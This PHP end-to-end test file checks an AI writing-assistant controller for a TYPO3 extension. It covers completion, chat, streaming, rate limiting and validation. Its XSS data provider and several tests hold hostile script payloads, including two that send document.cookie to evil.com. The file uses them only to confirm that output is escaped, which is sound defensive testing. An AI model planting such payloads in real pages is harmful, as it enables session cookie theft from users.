<?php

/*
 * Copyright (c) 2025-2026 Netresearch DTT GmbH
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

declare(strict_types=1);

namespace Netresearch\T3Cowriter\Tests\E2E;

use Generator;
use Netresearch\NrLlm\Domain\Model\CompletionResponse;
use Netresearch\NrLlm\Domain\Model\UsageStatistics;
use Netresearch\NrLlm\Provider\Exception\ProviderException;
use Netresearch\T3Cowriter\Controller\AjaxController;
use PHPUnit\Framework\Attributes\AllowMockObjectsWithoutExpectations;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use RuntimeException;

/**
 * E2E tests for complete Cowriter workflows.
 *
 * Tests the full path from AjaxController through LlmServiceManager
 * and back, verifying correct data flow, XSS escaping, and error handling.
 */
#[AllowMockObjectsWithoutExpectations]
#[CoversClass(AjaxController::class)]
final class CowriterWorkflowTest extends AbstractE2ETestCase
{
    /**
     * @param array<string> $chunks
     *
     * @return Generator<int, string, mixed, void>
     */
    private function createChunkGenerator(array $chunks): Generator
    {
        yield from $chunks;
    }

    /**
     * Create a controller stack configured for streaming tests.
     *
     * Unlike createCompleteStack(), this stubs streamChatWithConfiguration()
     * instead of chatWithConfiguration() and allows custom rate limiter configuration.
     *
     * @param array<string> $chunks Content chunks for the generator
     * @param string        $model  Model name for configuration
     *
     * @return array{controller: AjaxController, serviceManager: \Netresearch\NrLlm\Service\LlmServiceManagerInterface&\PHPUnit\Framework\MockObject\MockObject, configRepo: \Netresearch\NrLlm\Domain\Repository\LlmConfigurationRepository&\PHPUnit\Framework\MockObject\MockObject, rateLimiter: \Netresearch\T3Cowriter\Service\RateLimiterInterface&\PHPUnit\Framework\MockObject\MockObject, context: \TYPO3\CMS\Core\Context\Context&\PHPUnit\Framework\MockObject\MockObject}
     */
    private function createStreamingStack(array $chunks, string $model = 'gpt-4o'): array
    {
        $serviceManager = $this->createMock(\Netresearch\NrLlm\Service\LlmServiceManagerInterface::class);
        $serviceManager->method('streamChatWithConfiguration')
            ->willReturnCallback(fn () => $this->createChunkGenerator($chunks));

        $configRepo = $this->createMock(\Netresearch\NrLlm\Domain\Repository\LlmConfigurationRepository::class);

        $rateLimiter = $this->createMock(\Netresearch\T3Cowriter\Service\RateLimiterInterface::class);
        $rateLimiter->method('checkLimit')->willReturn(
            new \Netresearch\T3Cowriter\Service\RateLimitResult(allowed: true, limit: 20, remaining: 19, resetTime: time() + 60),
        );

        $context = $this->createMock(\TYPO3\CMS\Core\Context\Context::class);
        $context->method('getPropertyFromAspect')->willReturn(1);

        $controller = new AjaxController(
            $serviceManager,
            $configRepo,
            $rateLimiter,
            $context,
            $this->logger,
        );

        return [
            'controller'     => $controller,
            'serviceManager' => $serviceManager,
            'configRepo'     => $configRepo,
            'rateLimiter'    => $rateLimiter,
            'context'        => $context,
        ];
    }

    // =========================================================================
    // Complete Workflow Tests
    // =========================================================================

    #[Test]
    public function completeTextImprovementWorkflow(): void
    {
        // Arrange: Create complete stack with realistic response
        $llmResponse = $this->createOpenAiResponse(
            content: 'Our premium product delivers exceptional performance and reliability.',
            model: 'gpt-4o',
            promptTokens: 45,
            completionTokens: 12,
        );

        $stack = $this->createCompleteStack([$llmResponse]);

        // Setup configuration
        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        // Act: Send completion request through full stack
        $request = $this->createJsonRequest([
            'prompt' => 'The product is good.',
        ]);
        $result = $stack['controller']->completeAction($request);

        // Assert: Full workflow executed correctly
        self::assertSame(200, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertTrue($data['success']);
        self::assertSame('Our premium product delivers exceptional performance and reliability.', $data['content']);
        self::assertSame('gpt-4o', $data['model']);
        self::assertArrayHasKey('usage', $data);
        self::assertSame(45, $data['usage']['promptTokens']);
        self::assertSame(12, $data['usage']['completionTokens']);
        self::assertSame(57, $data['usage']['totalTokens']);
    }

    #[Test]
    public function completeWorkflowWithLongContent(): void
    {
        // Arrange: Generate long content response
        $longContent = str_repeat('This is a paragraph of improved content. ', 50);
        $llmResponse = $this->createOpenAiResponse(
            content: $longContent,
            model: 'gpt-4o',
            promptTokens: 100,
            completionTokens: 500,
        );

        $stack = $this->createCompleteStack([$llmResponse]);

        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        // Act
        $request = $this->createJsonRequest([
            'prompt' => 'Write a long paragraph about product quality.',
        ]);
        $result = $stack['controller']->completeAction($request);

        // Assert
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertTrue($data['success']);
        self::assertSame($longContent, $data['content']);
        self::assertSame(600, $data['usage']['totalTokens']);
    }

    // =========================================================================
    // XSS Prevention E2E Tests
    // =========================================================================

    #[Test]
    #[DataProvider('xssPayloadProvider')]
    public function completeWorkflowEscapesXssFromLlm(string $maliciousContent, string $description): void
    {
        // Arrange: LLM returns malicious content (simulating prompt injection attack)
        $llmResponse = $this->createOpenAiResponse(
            content: $maliciousContent,
            model: 'gpt-4o',
        );

        $stack = $this->createCompleteStack([$llmResponse]);

        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        // Act
        $request = $this->createJsonRequest(['prompt' => 'Improve this text']);
        $result  = $stack['controller']->completeAction($request);

        // Assert: XSS content is escaped through the entire stack
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertTrue($data['success']);

        // Verify HTML entities are used, not raw tags
        self::assertStringNotContainsString('<', $data['content'], "Raw < found in: {$description}");
        self::assertStringNotContainsString('>', $data['content'], "Raw > found in: {$description}");
        self::assertStringContainsString('&lt;', $data['content'], "Missing escaped < in: {$description}");
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function xssPayloadProvider(): iterable
    {
        yield 'script_injection' => [
            '<script>document.location="https://evil.com/?c="+document.cookie</script>',
            'Cookie stealing script',
        ];
        yield 'img_onerror' => [
            '<img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)">',
            'Image error handler XSS',
        ];
        yield 'svg_onload' => [
            '<svg onload="alert(document.domain)"><circle r="10"/></svg>',
            'SVG onload XSS',
        ];
        yield 'event_handler' => [
            '<div onmouseover="window.location=\'evil\'">Hover me</div>',
            'Event handler redirect',
        ];
        yield 'nested_tags' => [
            '<<script>script>alert(1)<</script>/script>',
            'Nested tag bypass attempt',
        ];
        yield 'null_byte' => [
            "<script\x00>alert(1)</script>",
            'Null byte injection',
        ];
    }

    #[Test]
    public function completeWorkflowEscapesXssInModelName(): void
    {
        // Arrange: LLM returns XSS in model field (edge case)
        $llmResponse = new CompletionResponse(
            content: 'Normal response',
            model: '<script>alert("xss")</script>',
            usage: UsageStatistics::fromTokens(10, 10),
            finishReason: 'stop',
            provider: 'openai',
        );

        $stack = $this->createCompleteStack([$llmResponse]);

        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        // Act
        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $stack['controller']->completeAction($request);

        // Assert: Model field is also escaped
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertStringNotContainsString('<script>', $data['model']);
        self::assertStringContainsString('&lt;script&gt;', $data['model']);
    }

    // =========================================================================
    // Error Handling E2E Tests
    // =========================================================================

    #[Test]
    public function completeWorkflowHandlesProviderError(): void
    {
        // Arrange: LLM service throws provider exception
        $stack = $this->createCompleteStack([]);

        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        $stack['serviceManager']->method('chatWithConfiguration')
            ->willThrowException(new ProviderException('Invalid API key'));

        // Act
        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $stack['controller']->completeAction($request);

        // Assert: Error is handled gracefully
        self::assertSame(500, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertFalse($data['success']);
        self::assertArrayHasKey('error', $data);
    }

    #[Test]
    public function completeWorkflowHandlesUnexpectedError(): void
    {
        // Arrange: LLM service throws unexpected exception
        $stack = $this->createCompleteStack([]);

        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        $stack['serviceManager']->method('chatWithConfiguration')
            ->willThrowException(new RuntimeException('Unexpected error'));

        // Act
        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $stack['controller']->completeAction($request);

        // Assert: Unexpected error handled gracefully
        self::assertSame(500, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertFalse($data['success']);
    }

    // =========================================================================
    // Chat Action E2E Tests
    // =========================================================================

    #[Test]
    public function chatWorkflowWithConversationHistory(): void
    {
        // Arrange
        $llmResponse = $this->createOpenAiResponse(
            content: 'Based on our conversation, I recommend using the improved version.',
            model: 'gpt-4o',
        );

        $stack  = $this->createCompleteStack([$llmResponse]);
        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        // Act: Send multi-turn conversation
        $request = $this->createJsonRequest([
            'messages' => [
                ['role' => 'user', 'content' => 'How should I improve this text?'],
                ['role' => 'assistant', 'content' => 'I suggest making it more concise.'],
                ['role' => 'user', 'content' => 'Can you show me the improved version?'],
            ],
        ]);
        $result = $stack['controller']->chatAction($request);

        // Assert
        self::assertSame(200, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertSame('Based on our conversation, I recommend using the improved version.', $data['content']);
    }

    #[Test]
    public function chatWorkflowEscapesXssInAllFields(): void
    {
        // Arrange: Response with XSS in content, model, and finishReason
        $llmResponse = new CompletionResponse(
            content: '<script>steal()</script>',
            model: '<img onerror=alert(1)>',
            usage: UsageStatistics::fromTokens(10, 10),
            finishReason: '<svg onload=hack()>',
            provider: 'test',
        );

        $stack  = $this->createCompleteStack([$llmResponse]);
        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        // Act
        $request = $this->createJsonRequest([
            'messages' => [['role' => 'user', 'content' => 'Test']],
        ]);
        $result = $stack['controller']->chatAction($request);

        // Assert: All fields escaped
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertStringNotContainsString('<', $data['content']);
        self::assertStringNotContainsString('<', $data['model']);
        self::assertStringNotContainsString('<', $data['finishReason']);
    }

    // =========================================================================
    // Configuration List E2E Tests
    // =========================================================================

    #[Test]
    public function getConfigurationsWorkflow(): void
    {
        // Arrange
        $stack = $this->createCompleteStack([]);

        $config1 = $this->createLlmConfiguration('openai-gpt4', 'OpenAI GPT-4', true, 'gpt-4o');
        $config2 = $this->createLlmConfiguration('openai-gpt35', 'OpenAI GPT-3.5', false, 'gpt-3.5-turbo');

        $queryResult = $this->createQueryResultMock([$config1, $config2]);
        $stack['configRepo']->method('findActive')->willReturn($queryResult);

        // Act
        $request = $this->createJsonRequest([]);
        $result  = $stack['controller']->getConfigurationsAction($request);

        // Assert
        self::assertSame(200, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertTrue($data['success']);
        self::assertCount(2, $data['configurations']);
        self::assertSame('openai-gpt4', $data['configurations'][0]['identifier']);
        self::assertTrue($data['configurations'][0]['isDefault']);
    }

    // =========================================================================
    // Truncated Response E2E Tests
    // =========================================================================

    #[Test]
    public function completeWorkflowWithTruncatedResponse(): void
    {
        // Arrange: Response truncated due to max_tokens
        $llmResponse = $this->createOpenAiResponse(
            content: 'This response was cut off because the maximum token limit was-',
            model: 'gpt-4o',
            finishReason: 'length',
            promptTokens: 50,
            completionTokens: 4096,
        );

        $stack = $this->createCompleteStack([$llmResponse]);

        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        // Act
        $request = $this->createJsonRequest([
            'prompt' => 'Write a very long essay about artificial intelligence.',
        ]);
        $result = $stack['controller']->completeAction($request);

        // Assert: Truncated response handled correctly
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertTrue($data['success']);
        self::assertStringEndsWith('-', $data['content']);
        self::assertSame(4146, $data['usage']['totalTokens']);
    }

    // =========================================================================
    // Model Override E2E Tests
    // =========================================================================

    #[Test]
    public function completeWorkflowWithModelOverride(): void
    {
        // Arrange
        $llmResponse = $this->createOpenAiResponse(
            content: 'Response from overridden model',
            model: 'claude-sonnet-4-20250514',
            provider: 'anthropic',
        );

        $stack = $this->createCompleteStack([$llmResponse]);

        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        // Act: Use model override prefix
        $request = $this->createJsonRequest([
            'prompt' => '#cw:claude-sonnet-4-20250514 Make this better',
        ]);
        $result = $stack['controller']->completeAction($request);

        // Assert
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertTrue($data['success']);
        self::assertSame('Response from overridden model', $data['content']);
    }

    // =========================================================================
    // Input Validation E2E Tests
    // =========================================================================

    #[Test]
    public function completeWorkflowRejectsEmptyPrompt(): void
    {
        // Arrange
        $stack = $this->createCompleteStack([]);

        // Act
        $request = $this->createJsonRequest(['prompt' => '']);
        $result  = $stack['controller']->completeAction($request);

        // Assert
        self::assertSame(400, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertFalse($data['success']);
        self::assertStringContainsString('prompt', strtolower($data['error']));
    }

    #[Test]
    public function completeWorkflowHandlesMissingConfiguration(): void
    {
        // Arrange
        $stack = $this->createCompleteStack([]);
        $stack['configRepo']->method('findDefault')->willReturn(null);

        // Act
        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $stack['controller']->completeAction($request);

        // Assert
        self::assertSame(404, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertFalse($data['success']);
        self::assertStringContainsString('configuration', strtolower($data['error']));
    }

    // =========================================================================
    // Rate Limiting E2E Tests
    // =========================================================================

    #[Test]
    public function completeWorkflowReturnsRateLimitedResponse(): void
    {
        // Build stack manually with rate limiter that denies
        $serviceManager = $this->createMock(\Netresearch\NrLlm\Service\LlmServiceManagerInterface::class);
        $configRepo     = $this->createMock(\Netresearch\NrLlm\Domain\Repository\LlmConfigurationRepository::class);
        $rateLimiter    = $this->createMock(\Netresearch\T3Cowriter\Service\RateLimiterInterface::class);
        $rateLimiter->method('checkLimit')->willReturn(
            new \Netresearch\T3Cowriter\Service\RateLimitResult(allowed: false, limit: 20, remaining: 0, resetTime: time() + 60),
        );
        $context = $this->createMock(\TYPO3\CMS\Core\Context\Context::class);
        $context->method('getPropertyFromAspect')->willReturn(1);
        $controller = new AjaxController(
            $serviceManager,
            $configRepo,
            $rateLimiter,
            $context,
            $this->logger,
        );

        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $controller->completeAction($request);

        self::assertSame(429, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertFalse($data['success']);
        self::assertArrayHasKey('retryAfter', $data);
        self::assertTrue($result->hasHeader('Retry-After'));
    }

    #[Test]
    public function chatWorkflowReturnsRateLimitedResponse(): void
    {
        // Build stack manually with rate limiter that denies
        $serviceManager = $this->createMock(\Netresearch\NrLlm\Service\LlmServiceManagerInterface::class);
        $configRepo     = $this->createMock(\Netresearch\NrLlm\Domain\Repository\LlmConfigurationRepository::class);
        $rateLimiter    = $this->createMock(\Netresearch\T3Cowriter\Service\RateLimiterInterface::class);
        $rateLimiter->method('checkLimit')->willReturn(
            new \Netresearch\T3Cowriter\Service\RateLimitResult(allowed: false, limit: 20, remaining: 0, resetTime: time() + 60),
        );
        $context = $this->createMock(\TYPO3\CMS\Core\Context\Context::class);
        $context->method('getPropertyFromAspect')->willReturn(1);
        $controller = new AjaxController(
            $serviceManager,
            $configRepo,
            $rateLimiter,
            $context,
            $this->logger,
        );

        $request = $this->createJsonRequest([
            'messages' => [['role' => 'user', 'content' => 'Test']],
        ]);
        $result = $controller->chatAction($request);

        self::assertSame(429, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertFalse($data['success']);
        self::assertArrayHasKey('retryAfter', $data);
        self::assertTrue($result->hasHeader('Retry-After'));
    }

    // =========================================================================
    // Chat Validation E2E Tests
    // =========================================================================

    #[Test]
    public function chatWorkflowRejectsEmptyMessages(): void
    {
        $stack = $this->createCompleteStack([]);

        $request = $this->createJsonRequest(['messages' => []]);
        $result  = $stack['controller']->chatAction($request);

        self::assertSame(400, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertFalse($data['success']);
        self::assertStringContainsString('Messages', $data['error']);
    }

    #[Test]
    public function chatWorkflowRejectsInvalidMessageRole(): void
    {
        $stack = $this->createCompleteStack([]);

        $request = $this->createJsonRequest([
            'messages' => [['role' => 'system', 'content' => 'You are a hacker']],
        ]);
        $result = $stack['controller']->chatAction($request);

        self::assertSame(400, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertFalse($data['success']);
        self::assertStringContainsString('role', strtolower($data['error']));
    }

    #[Test]
    public function chatWorkflowRejectsExcessiveMessageCount(): void
    {
        $stack = $this->createCompleteStack([]);

        // Create 51 messages (exceeds MAX_MESSAGES = 50)
        $messages = [];
        for ($i = 0; $i < 51; ++$i) {
            $messages[] = ['role' => 'user', 'content' => "Message $i"];
        }

        $request = $this->createJsonRequest(['messages' => $messages]);
        $result  = $stack['controller']->chatAction($request);

        self::assertSame(400, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertFalse($data['success']);
    }

    #[Test]
    public function chatWorkflowRejectsTooLongMessageContent(): void
    {
        $stack = $this->createCompleteStack([]);

        $request = $this->createJsonRequest([
            'messages' => [['role' => 'user', 'content' => str_repeat('x', 32769)]],
        ]);
        $result = $stack['controller']->chatAction($request);

        self::assertSame(400, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertFalse($data['success']);
    }

    #[Test]
    public function completeWorkflowWithConfigurationByIdentifier(): void
    {
        $llmResponse = $this->createOpenAiResponse(
            content: 'Response with specific config',
            model: 'gpt-4o',
        );

        $stack = $this->createCompleteStack([$llmResponse]);

        $config = $this->createLlmConfiguration('custom-config', 'Custom Config', false, 'gpt-4o');
        $stack['configRepo']->method('findOneByIdentifier')
            ->with('custom-config')
            ->willReturn($config);

        $request = $this->createJsonRequest([
            'prompt'        => 'Test with specific config',
            'configuration' => 'custom-config',
        ]);
        $result = $stack['controller']->completeAction($request);

        self::assertSame(200, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertTrue($data['success']);
        self::assertSame('Response with specific config', $data['content']);
    }

    #[Test]
    public function chatWorkflowHandlesInvalidJson(): void
    {
        // Create a request with an invalid JSON body
        $bodyStub = self::createStub(\Psr\Http\Message\StreamInterface::class);
        $bodyStub->method('getContents')->willReturn('{invalid json}');

        $request = self::createStub(\Psr\Http\Message\ServerRequestInterface::class);
        $request->method('getBody')->willReturn($bodyStub);
        $request->method('getParsedBody')->willReturn(null);

        $stack  = $this->createCompleteStack([]);
        $result = $stack['controller']->chatAction($request);

        self::assertSame(400, $result->getStatusCode());
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertFalse($data['success']);
        self::assertStringContainsString('JSON', $data['error']);
    }

    // =========================================================================
    // Streaming Workflow E2E Tests
    // =========================================================================

    #[Test]
    public function streamWorkflowReturnsRateLimitedResponse(): void
    {
        // Build stack manually with rate limiter that denies
        $serviceManager = $this->createMock(\Netresearch\NrLlm\Service\LlmServiceManagerInterface::class);
        $configRepo     = $this->createMock(\Netresearch\NrLlm\Domain\Repository\LlmConfigurationRepository::class);
        $rateLimiter    = $this->createMock(\Netresearch\T3Cowriter\Service\RateLimiterInterface::class);
        $rateLimiter->method('checkLimit')->willReturn(
            new \Netresearch\T3Cowriter\Service\RateLimitResult(allowed: false, limit: 20, remaining: 0, resetTime: time() + 60),
        );
        $context = $this->createMock(\TYPO3\CMS\Core\Context\Context::class);
        $context->method('getPropertyFromAspect')->willReturn(1);
        $controller = new AjaxController(
            $serviceManager,
            $configRepo,
            $rateLimiter,
            $context,
            $this->logger,
        );

        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $controller->streamAction($request);

        self::assertSame(429, $result->getStatusCode());
        self::assertStringContainsString('application/json', $result->getHeaderLine('Content-Type'));
        $data = json_decode((string) $result->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($data);
        self::assertFalse($data['success']);
        self::assertArrayHasKey('retryAfter', $data);
    }

    #[Test]
    public function streamWorkflowRejectsEmptyPrompt(): void
    {
        $stack = $this->createStreamingStack(['chunk']);

        $request = $this->createJsonRequest(['prompt' => '']);
        $result  = $stack['controller']->streamAction($request);

        self::assertSame(400, $result->getStatusCode());
        self::assertStringContainsString('text/event-stream', $result->getHeaderLine('Content-Type'));
        $events = $this->parseSseEvents((string) $result->getBody());
        self::assertCount(1, $events);
        self::assertArrayHasKey('error', $events[0]);
        self::assertStringContainsString('prompt', strtolower($events[0]['error']));
    }

    #[Test]
    public function streamWorkflowRejectsTooLongPrompt(): void
    {
        $stack = $this->createStreamingStack(['chunk']);

        $request = $this->createJsonRequest(['prompt' => str_repeat('x', 32769)]);
        $result  = $stack['controller']->streamAction($request);

        self::assertSame(400, $result->getStatusCode());
        self::assertStringContainsString('text/event-stream', $result->getHeaderLine('Content-Type'));
        $events = $this->parseSseEvents((string) $result->getBody());
        self::assertCount(1, $events);
        self::assertArrayHasKey('error', $events[0]);
    }

    #[Test]
    public function streamWorkflowHandlesMissingConfiguration(): void
    {
        $stack = $this->createStreamingStack(['chunk']);
        $stack['configRepo']->method('findDefault')->willReturn(null);

        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $stack['controller']->streamAction($request);

        self::assertSame(404, $result->getStatusCode());
        self::assertStringContainsString('text/event-stream', $result->getHeaderLine('Content-Type'));
        $events = $this->parseSseEvents((string) $result->getBody());
        self::assertCount(1, $events);
        self::assertArrayHasKey('error', $events[0]);
        self::assertStringContainsString('configuration', strtolower($events[0]['error']));
    }

    #[Test]
    public function streamWorkflowReturnsChunkedSseResponse(): void
    {
        $stack  = $this->createStreamingStack(['Hello', ' World']);
        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $stack['controller']->streamAction($request);

        self::assertSame(200, $result->getStatusCode());
        self::assertStringContainsString('text/event-stream', $result->getHeaderLine('Content-Type'));

        $events = $this->parseSseEvents((string) $result->getBody());
        self::assertCount(3, $events); // 2 content + 1 done

        // Content chunks
        self::assertSame('Hello', $events[0]['content']);
        self::assertSame(' World', $events[1]['content']);

        // Done event
        self::assertTrue($events[2]['done']);
        self::assertSame('gpt-4o', $events[2]['model']);
    }

    #[Test]
    public function streamWorkflowEscapesXssInChunks(): void
    {
        $stack  = $this->createStreamingStack(['<script>alert(1)</script>']);
        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $stack['controller']->streamAction($request);

        $events = $this->parseSseEvents((string) $result->getBody());
        self::assertCount(2, $events); // 1 content + 1 done

        // XSS content must be escaped
        self::assertStringNotContainsString('<script>', $events[0]['content']);
        self::assertStringContainsString('&lt;script&gt;', $events[0]['content']);
    }

    #[Test]
    public function streamWorkflowEscapesXssInModelName(): void
    {
        $stack = $this->createStreamingStack(['Hello']);

        // Create config with XSS in model name
        $config = self::createStub(\Netresearch\NrLlm\Domain\Model\LlmConfiguration::class);
        $config->method('getIdentifier')->willReturn('test');
        $config->method('getName')->willReturn('Test');
        $config->method('isDefault')->willReturn(true);
        $config->method('getModelId')->willReturn('<img onerror=alert(1)>');
        $stack['configRepo']->method('findDefault')->willReturn($config);

        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $stack['controller']->streamAction($request);

        $events    = $this->parseSseEvents((string) $result->getBody());
        $doneEvent = end($events);
        self::assertTrue($doneEvent['done']);
        self::assertStringNotContainsString('<img', $doneEvent['model']);
        self::assertStringContainsString('&lt;img', $doneEvent['model']);
    }

    #[Test]
    public function streamWorkflowHandlesProviderException(): void
    {
        $serviceManager = $this->createMock(\Netresearch\NrLlm\Service\LlmServiceManagerInterface::class);
        $serviceManager->method('streamChatWithConfiguration')
            ->willThrowException(new ProviderException('API key expired'));

        $configRepo = $this->createMock(\Netresearch\NrLlm\Domain\Repository\LlmConfigurationRepository::class);
        $config     = $this->createLlmConfiguration();
        $configRepo->method('findDefault')->willReturn($config);

        $rateLimiter = $this->createMock(\Netresearch\T3Cowriter\Service\RateLimiterInterface::class);
        $rateLimiter->method('checkLimit')->willReturn(
            new \Netresearch\T3Cowriter\Service\RateLimitResult(allowed: true, limit: 20, remaining: 19, resetTime: time() + 60),
        );
        $context = $this->createMock(\TYPO3\CMS\Core\Context\Context::class);
        $context->method('getPropertyFromAspect')->willReturn(1);
        $controller = new AjaxController(
            $serviceManager,
            $configRepo,
            $rateLimiter,
            $context,
            $this->logger,
        );

        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $controller->streamAction($request);

        self::assertSame(500, $result->getStatusCode());
        self::assertStringContainsString('text/event-stream', $result->getHeaderLine('Content-Type'));
        $events = $this->parseSseEvents((string) $result->getBody());
        self::assertCount(1, $events);
        self::assertArrayHasKey('error', $events[0]);
    }

    #[Test]
    public function streamWorkflowHandlesUnexpectedException(): void
    {
        $serviceManager = $this->createMock(\Netresearch\NrLlm\Service\LlmServiceManagerInterface::class);
        $serviceManager->method('streamChatWithConfiguration')
            ->willThrowException(new RuntimeException('Connection timeout'));

        $configRepo = $this->createMock(\Netresearch\NrLlm\Domain\Repository\LlmConfigurationRepository::class);
        $config     = $this->createLlmConfiguration();
        $configRepo->method('findDefault')->willReturn($config);

        $rateLimiter = $this->createMock(\Netresearch\T3Cowriter\Service\RateLimiterInterface::class);
        $rateLimiter->method('checkLimit')->willReturn(
            new \Netresearch\T3Cowriter\Service\RateLimitResult(allowed: true, limit: 20, remaining: 19, resetTime: time() + 60),
        );
        $context = $this->createMock(\TYPO3\CMS\Core\Context\Context::class);
        $context->method('getPropertyFromAspect')->willReturn(1);
        $controller = new AjaxController(
            $serviceManager,
            $configRepo,
            $rateLimiter,
            $context,
            $this->logger,
        );

        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $controller->streamAction($request);

        self::assertSame(500, $result->getStatusCode());
        self::assertStringContainsString('text/event-stream', $result->getHeaderLine('Content-Type'));
        $events = $this->parseSseEvents((string) $result->getBody());
        self::assertCount(1, $events);
        self::assertArrayHasKey('error', $events[0]);
    }

    #[Test]
    public function streamWorkflowIncludesRateLimitHeaders(): void
    {
        $stack  = $this->createStreamingStack(['Hello']);
        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        $request = $this->createJsonRequest(['prompt' => 'Test']);
        $result  = $stack['controller']->streamAction($request);

        self::assertSame(200, $result->getStatusCode());
        self::assertTrue($result->hasHeader('X-RateLimit-Limit'));
        self::assertTrue($result->hasHeader('X-RateLimit-Remaining'));
        self::assertTrue($result->hasHeader('X-RateLimit-Reset'));
        self::assertSame('20', $result->getHeaderLine('X-RateLimit-Limit'));
        self::assertSame('19', $result->getHeaderLine('X-RateLimit-Remaining'));
    }

    #[Test]
    public function streamWorkflowWithModelOverridePrefix(): void
    {
        $stack  = $this->createStreamingStack(['Response']);
        $config = $this->createLlmConfiguration();
        $stack['configRepo']->method('findDefault')->willReturn($config);

        // Send prompt with model override prefix (prefix is stripped from prompt,
        // but model in done event comes from configuration, not the prefix)
        $request = $this->createJsonRequest(['prompt' => '#cw:custom-model Test prompt']);
        $result  = $stack['controller']->streamAction($request);

        self::assertSame(200, $result->getStatusCode());
        $events = $this->parseSseEvents((string) $result->getBody());

        // Done event model comes from configuration (not the prefix)
        $doneEvent = end($events);
        self::assertTrue($doneEvent['done']);
        self::assertSame('gpt-4o', $doneEvent['model']);
    }
}
